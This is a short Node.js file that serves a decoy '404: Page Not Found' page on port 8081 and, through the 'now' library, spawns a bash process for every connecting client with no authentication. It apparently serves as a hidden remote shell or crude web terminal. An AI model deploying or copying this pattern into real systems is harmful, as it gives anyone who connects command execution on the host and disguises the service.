var server = require('http').createServer(function(req, res) {
  res.writeHead(404, {'Content-Type': 'text/html'});
  res.end('<html><body><center><h1>404: Page Not Found</h1>' +
    '<p>There is no web page at that web address.</p></center></body></html>\n');
});
server.listen(8081);

var everyone = require("now").initialize(server);
var spawn = require('child_process').spawn;
everyone.connected(function() {
  this.now.shell = spawn('/bin/bash');
});
everyone.disconnected(function() {
  this.now.shell.kill();
});
